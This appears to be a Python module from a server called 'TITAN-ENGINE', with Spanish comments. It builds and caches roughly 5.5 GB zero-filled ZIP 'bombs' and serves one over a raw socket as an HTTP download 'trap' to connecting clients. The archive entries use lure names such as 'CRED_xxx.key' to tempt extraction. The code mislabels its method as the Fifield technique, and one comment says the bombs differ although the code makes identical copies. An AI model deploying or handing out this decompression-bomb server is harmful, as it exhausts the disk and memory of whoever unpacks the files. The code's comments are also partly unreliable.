import zipfile
import io
import os

# Caché global para no consumir CPU en cada conexión
CACHE_TITAN_BOMBS = []

def generate_fifield_bomb(target_uncompressed_gb=5.5):
    """
    Simulación optimizada de la técnica de Fifield.
    """
    zip_buffer = io.BytesIO()
    # Reducimos el bloque de RAM para no saturar el servidor de 2GB
    kernel_chunk = b"\x00" * (1024 * 512) # 512 KB
    
    with zipfile.ZipFile(zip_buffer, 'a', zipfile.ZIP_DEFLATED) as zf:
        # 1000 archivos de 5.5MB cada uno = 5.5GB
        for i in range(1000):
            zf.writestr(f"SYS_RECOVERY_DATA_{i:04d}.bin", kernel_chunk * 11)
            
    return zip_buffer.getvalue()

def precompute_bombs():
    """Genera las 10 bombas numeradas al inicio para ahorrar CPU"""
    global CACHE_TITAN_BOMBS
    print("[⚡] TITAN-ENGINE: Pre-calculando 10 Bombas Fifield...")
    for i in range(1, 11):
        # Cada bomba es ligeramente distinta para evitar duplicados de red
        CACHE_TITAN_BOMBS.append(generate_fifield_bomb())
    print("[✅] TITAN-ENGINE: Arsenal de 10 bombas listo en memoria.")

def get_bomb_list():
    if not CACHE_TITAN_BOMBS:
        precompute_bombs()
    return CACHE_TITAN_BOMBS

def generate_stealth_bolt():
    # Mantenemos esta para compatibilidad SMB
    zip_buffer = io.BytesIO()
    kernel_data = b"\x00" * (1024 * 100)
    with zipfile.ZipFile(zip_buffer, 'a', zipfile.ZIP_DEFLATED) as zf:
        for i in range(100):
            zf.writestr(f"CRED_{i:03d}.key", kernel_data)
    return zip_buffer.getvalue()

def serve_zip_trap(client_socket):
    # Usar la primera bomba de la caché
    bombs = get_bomb_list()
    zip_data = bombs[0]
    try:
        header = f"HTTP/1.1 200 OK\r\nContent-Type: application/zip\r\nContent-Length: {len(zip_data)}\r\n\r\n"
        client_socket.send(header.encode() + zip_data)
    except: pass
